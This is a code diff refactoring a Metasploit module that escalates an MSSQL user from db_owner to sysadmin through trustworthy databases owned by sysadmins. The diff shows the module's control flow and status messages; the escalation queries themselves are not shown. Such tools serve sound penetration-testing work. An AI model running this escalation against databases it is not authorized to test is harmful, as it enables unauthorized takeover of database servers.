@@ -37,51 +37,54 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Query for sysadmin status
-    print_status("Checking if #{datastore['username']} has the sysadmin role...")
-    mystatus = check_sysadmin
+    print_status("Checking if #{datastore['USERNAME']} has the sysadmin role...")
+    user_status = check_sysadmin
 
     # Check if user has sysadmin role
-    if mystatus == 1
+    if user_status == 1
       print_good("#{datastore['username']} has the sysadmin role, no escalation required.")
+      disconnect
+      return
     else
+      print_status("You're NOT a sysadmin, let's try to change that")
+    end
 
-      # Check for trusted databases owned by sysadmins
-      print_error("You're NOT a sysadmin, let's try to change that.")
-      print_status("Checking for trusted databases owned by sysadmins...")
-      trustdb_list = check_trustdbs
-      if trustdb_list == 0
-        print_error('No databases owned by sysadmin were found flagged as trustworthy.')
+    # Check for trusted databases owned by sysadmins
+    print_status("Checking for trusted databases owned by sysadmins...")
+    trust_db_list = check_trustdbs
+    if trust_db_list == 0
+      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
+      disconnect
+      return
+    end
+
+    # Display list of accessible databases to user
+    trust_db_list.each do |db|
+      print_status(" - #{db[0]}")
+    end
+
+    # Check if the user has the db_owner role in any of the databases
+    print_status('Checking if the user has the db_owner role in any of them...')
+    dbowner_status = check_db_owner(trust_db_list)
+    if dbowner_status == 0
+      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
+      disconnect
+      return
+    end
+
+    # Attempt to escalate to sysadmin
+    print_status("Attempting to escalate in #{dbowner_status}!")
+    escalate_status = escalate_privs(dbowner_status)
+    if escalate_status == 1
+      # Check if escalation was successful
+      mystatus = check_sysadmin
+      if mystatus == 1
+        print_good("Congrats, #{datastore['username']} is now a sysadmin!.")
       else
-
-        # Display list of accessible databases to user
-        trustdb_list.each { |trustdb|
-          print_status(" - #{trustdb[0]}")
-        }
-
-        # Check if the user has the db_owner role in any of the databases
-        print_status('Checking if the user has the db_owner role in any of them...')
-        dbowner_status = check_db_owner(trustdb_list)
-        if dbowner_status == 0
-          print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
-        else
-
-          # Attempt to escalate to sysadmin
-          print_status("Attempting to escalate in #{dbowner_status}!")
-          escalate_status = escalate_privs(dbowner_status)
-          if escalate_status == 1
-
-            # Check if escalation was successful
-            mystatus = check_sysadmin
-            if mystatus == 1
-              print_good("Congrats, #{datastore['username']} is now a sysadmin!.")
-            else
-              print_error("Fail buckets, something went wrong.")
-            end
-          else
-            print_error("Error: #{escalate_status}")
-          end
-        end
+        print_error("Fail buckets, something went wrong.")
       end
+    else
+      print_error("Error: #{escalate_status}")
     end
 
     disconnect
@@ -98,10 +101,10 @@ class Metasploit3 < Msf::Auxiliary
 
     # Parse query results
     parse_results = result[:rows]
-    mystatus = parse_results[0][0]
+    status = parse_results[0][0]
 
     # Return status
-    return mystatus
+    return status
   end
 
   # Gets trusted databases owned by sysadmins
